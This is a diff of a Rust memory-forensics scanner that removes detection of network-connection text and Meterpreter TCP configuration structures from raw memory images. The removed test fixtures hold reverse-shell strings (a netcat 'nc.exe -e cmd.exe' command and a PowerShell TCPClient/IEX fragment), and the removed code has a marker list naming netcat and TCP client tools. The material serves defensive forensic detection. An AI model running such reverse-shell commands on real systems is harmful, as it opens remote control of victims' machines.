@@ -82,78 +82,13 @@ fn candidate(
     ))
 }
 
-fn text_context(bytes: &[u8], at: usize, step: usize) -> (usize, String) {
-    let unit = |i: usize| -> Option<u8> {
-        let b = *bytes.get(i)?;
-        (step == 1 || bytes.get(i + 1) == Some(&0))
-            .then_some(b)
-            .filter(|b| matches!(b, 9 | 10 | 13 | 32..=126))
-    };
-    let mut left = at;
-    while left >= step && at - left < 512 && unit(left - step).is_some() {
-        left -= step;
-    }
-    let mut right = at;
-    while right < bytes.len() && right - left < 8192 && unit(right).is_some() {
-        right += step;
-    }
-    let text = bytes[left..right]
-        .chunks(step)
-        .map(|b| char::from(b[0]))
-        .collect::<String>();
-    (left, text)
-}
-
-// Legacy Meterpreter Windows configuration: 48-byte session, 512 WCHAR URL,
-// three DWORD timeouts, then the next transport or a zero terminator.
-// https://github.com/rapid7/metasploit-framework/blob/6.3.31/lib/rex/payloads/meterpreter/config.rb
-fn meterpreter_config(bytes: &[u8], at: usize, address: &str) -> Option<serde_json::Value> {
-    let session = bytes.get(at.checked_sub(48)?..at)?;
-    let url = bytes.get(at..at + 1024)?;
-    let used = address.encode_utf16().count().checked_mul(2)?;
-    if used >= 1024 || url.get(used..)?.iter().any(|b| *b != 0) {
-        return None;
-    }
-    let dword =
-        |slice: &[u8], i: usize| Some(u32::from_le_bytes(slice.get(i..i + 4)?.try_into().ok()?));
-    let exit = dword(session, 8)?;
-    if ![0, 0x56a2b5f0, 0x0a2a1de0, 0xea320efe, 0x5de2c5aa].contains(&exit) {
-        return None;
-    }
-    let expiry = dword(session, 12)?;
-    if expiry > 10 * 366 * 86400 || session[16..32].iter().all(|b| *b == 0) {
-        return None;
-    }
-    let timers = bytes.get(at + 1024..at + 1036)?;
-    let comms = dword(timers, 0)?;
-    let retry = dword(timers, 4)?;
-    let wait = dword(timers, 8)?;
-    if comms == 0
-        || comms > 366 * 86400
-        || retry == 0
-        || retry > 366 * 86400
-        || wait == 0
-        || wait > retry
-    {
-        return None;
-    }
-    if bytes.get(at + 1036..at + 1038) != Some(&[0, 0][..]) {
-        return None;
-    }
-    Some(
-        json!({"Payload UUID":session[16..32].iter().map(|b| format!("{b:02x}")).collect::<String>(),
-        "Session GUID":session[32..48].iter().map(|b| format!("{b:02x}")).collect::<String>(),
-        "Session expiry seconds":expiry,"Communications timeout seconds":comms,"Retry total seconds":retry,"Retry wait seconds":wait}),
-    )
-}
-
 pub(super) fn scan(
     path: &Path,
     names: &BTreeSet<String>,
     anchors: &[(u64, String, String)],
     cancel: &AtomicBool,
     progress: &impl Fn(String),
-) -> Result<(Vec<Record>, Vec<Record>, String), String> {
+) -> Result<(Vec<Record>, String), String> {
     let anchors = anchors
         .iter()
         .filter_map(|(pid, name, birth)| {
@@ -179,14 +114,6 @@ pub(super) fn scan(
     let omitted_names = searches.len().saturating_sub(128);
     // Engine inventories still cover every filename; bound the additional raw scan work.
     let searches = searches.into_iter().take(128).collect::<Vec<_>>();
-    let markers = [
-        "tcp://",
-        "TCPClient",
-        "TcpClient",
-        "tcpclient",
-        "nc.exe ",
-        "ncat.exe ",
-    ];
     let mut file = File::open(path).map_err(|e| e.to_string())?;
     let total = file.metadata().map_err(|e| e.to_string())?.len();
     let mut chunk = vec![0; CHUNK];
@@ -195,7 +122,6 @@ pub(super) fn scan(
     let mut scanned = 0u64;
     let mut matches = BTreeMap::new();
     let mut reference = BTreeSet::new();
-    let mut leads = BTreeMap::new();
     let mut limited = omitted_names > 0;
     loop {
         cancelled(cancel)?;
@@ -236,73 +162,6 @@ pub(super) fn scan(
                 }
             }
         }
-        if leads.len() < LIMIT {
-            'markers: for marker in markers {
-                for step in [1, 2] {
-                    let pattern = if step == 1 {
-                        marker.as_bytes().to_vec()
-                    } else {
-                        marker.encode_utf16().flat_map(u16::to_le_bytes).collect()
-                    };
-                    for at in memchr::memmem::find_iter(&buffer, &pattern)
-                        .filter(|at| *at < end && base + *at as u64 >= scanned)
-                    {
-                        if leads.len() >= LIMIT {
-                            limited = true;
-                            break 'markers;
-                        }
-                        let (left, text) = text_context(&buffer, at, step);
-                        for mut row in super::super::network::parse_text(&text) {
-                            if row.text("IP").is_empty() {
-                                continue;
-                            }
-                            row.fields
-                                .insert("Remote IP".into(), row.fields["IP"].clone());
-                            row.fields
-                                .insert("Remote port".into(), row.fields["Port"].clone());
-                            row.fields
-                                .insert("Acquisition offset".into(), (base + left as u64).into());
-                            row.fields
-                                .insert("Match offset".into(), (base + at as u64).into());
-                            row.fields.insert(
-                                "Encoding".into(),
-                                if step == 1 { "UTF-8" } else { "UTF-16LE" }.into(),
-                            );
-                            if step == 2
-                                && row.text("Finding") == "TCP transport endpoint"
-                                && let Some(config) =
-                                    meterpreter_config(&buffer, at, &row.text("URI"))
-                            {
-                                row.fields.insert(
-                                    "Finding".into(),
-                                    "Meterpreter TCP configuration".into(),
-                                );
-                                row.fields.insert("Payload configuration".into(), config);
-                                row.fields.insert(
-                                    "Configuration offset".into(),
-                                    (base + at as u64 - 48).into(),
-                                );
-                                row.fields.insert("Interpretation".into(),"Legacy Meterpreter session and TCP transport layout validated, including URL padding, payload UUID, exit function and timeouts. This is a configured endpoint; process ownership and a successful connection require separate evidence.".into());
-                            }
-                            row.fields.insert("Network evidence".into(),"Unattributed acquisition text; does not prove execution, connection or download association".into());
-                            row.fields.insert("Sources".into(),json!([{"Role":"Connection text","Offset":base+left as u64,"Encoding":row.text("Encoding")} ]));
-                            leads
-                                .entry((
-                                    base + left as u64,
-                                    row.text("IP"),
-                                    row.text("Port"),
-                                    row.text("Finding"),
-                                ))
-                                .or_insert(row);
-                            if leads.len() >= LIMIT {
-                                limited = true;
-                                break 'markers;
-                            }
-                        }
-                    }
-                }
-            }
-        }
         scanned = base + end as u64;
         if n == 0 {
             break;
@@ -331,7 +190,7 @@ pub(super) fn scan(
         Vec::new()
     };
     let message = format!(
-        "Scanned {total} acquisition bytes. Residual process profile {} against {} inventory PIDs. Carved process copies do not establish acquisition-time activity. Explicit connection text is kept separate from download and socket evidence.{}",
+        "Scanned {total} acquisition bytes. Residual process profile {} against {} inventory PIDs. Carved process copies do not establish acquisition-time activity.{}",
         if enabled { "validated" } else { "not enabled" },
         reference.len(),
         if limited {
@@ -340,56 +199,13 @@ pub(super) fn scan(
             ""
         }
     );
-    Ok((processes, leads.into_values().collect(), message))
+    Ok((processes, message))
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
     use std::fs;
-    #[test]
-    fn connection_limit_is_enforced_inside_one_marker_dense_chunk() {
-        let temp = tempfile::tempdir().unwrap();
-        let path = temp.path().join("memory.raw");
-        fs::write(
-            &path,
-            b"nc.exe -e cmd.exe 192.0.2.1 4444\0".repeat(LIMIT + 100),
-        )
-        .unwrap();
-        let (_, leads, message) = scan(
-            &path,
-            &BTreeSet::new(),
-            &[],
-            &AtomicBool::new(false),
-            &|_| {},
-        )
-        .unwrap();
-        assert_eq!(leads.len(), LIMIT);
-        assert!(message.contains("limit reached"));
-    }
-    #[test]
-    fn meterpreter_configuration_needs_the_structure_not_just_a_tcp_url() {
-        let address = "tcp://192.0.2.5:5059";
-        let mut bytes = vec![0; 48 + 1038];
-        bytes[8..12].copy_from_slice(&0x56a2b5f0u32.to_le_bytes());
-        bytes[12..16].copy_from_slice(&604800u32.to_le_bytes());
-        bytes[16..32].copy_from_slice(&[0x11; 16]);
-        let url = address
-            .encode_utf16()
-            .flat_map(u16::to_le_bytes)
-            .collect::<Vec<_>>();
-        bytes[48..48 + url.len()].copy_from_slice(&url);
-        for (i, v) in [300u32, 3600, 10].into_iter().enumerate() {
-            bytes[48 + 1024 + i * 4..48 + 1028 + i * 4].copy_from_slice(&v.to_le_bytes());
-        }
-        assert!(meterpreter_config(&bytes, 48, address).is_some());
-        bytes[48 + 100] = 1;
-        assert!(meterpreter_config(&bytes, 48, address).is_none());
-        bytes[48 + 100] = 0;
-        bytes[8..12].fill(0xff);
-        assert!(meterpreter_config(&bytes, 48, address).is_none());
-        assert!(meterpreter_config(&bytes[..48 + 100], 48, address).is_none());
-    }
     fn process(bytes: &mut [u8], base: usize, name: &str, pid: u64, birth: u64) {
         bytes[base] = 3;
         for (at, value) in [
@@ -423,12 +239,12 @@ mod tests {
         bytes[CHUNK + 100..CHUNK + 100 + 11].copy_from_slice(b"payload.exe"); // A name alone is not a process.
         fs::write(&path, &bytes).unwrap();
         let names = ["payload.exe".to_string()].into();
-        let (found, _, message) =
+        let (found, message) =
             scan(&path, &names, &anchors, &AtomicBool::new(false), &|_| {}).unwrap();
         assert_eq!(found.len(), 1, "{message}");
         assert_eq!(found[0].fields["Acquisition offset"], base);
         assert_eq!(found[0].fields["PID"], 900);
-        let (found, _, message) = scan(
+        let (found, message) = scan(
             &path,
             &names,
             &anchors[..4],
@@ -438,32 +254,5 @@ mod tests {
         .unwrap();
         assert!(found.is_empty());
         assert!(message.contains("not enabled"));
-    }
-    #[test]
-    fn raw_connection_text_is_unattributed_and_does_not_borrow_a_payload_pid() {
-        let temp = tempfile::tempdir().unwrap();
-        let path = temp.path().join("memory.raw");
-        let mut bytes = vec![0xff; CHUNK - OVERLAP - 8];
-        let at = bytes.len();
-        bytes.extend(
-            "New-Object Net.Sockets.TCPClient('192.0.2.5',4444); IEX $command"
-                .encode_utf16()
-                .flat_map(u16::to_le_bytes),
-        );
-        bytes.extend([0xff; 10]);
-        fs::write(&path, bytes).unwrap();
-        let (_, leads, _) = scan(
-            &path,
-            &BTreeSet::new(),
-            &[],
-            &AtomicBool::new(false),
-            &|_| {},
-        )
-        .unwrap();
-        assert_eq!(leads.len(), 1);
-        assert_eq!(leads[0].fields["Acquisition offset"], at);
-        assert_eq!(leads[0].text("Remote IP"), "192.0.2.5");
-        assert!(leads[0].text("PID").is_empty());
-        assert_eq!(leads[0].text("Encoding"), "UTF-16LE");
     }
 }
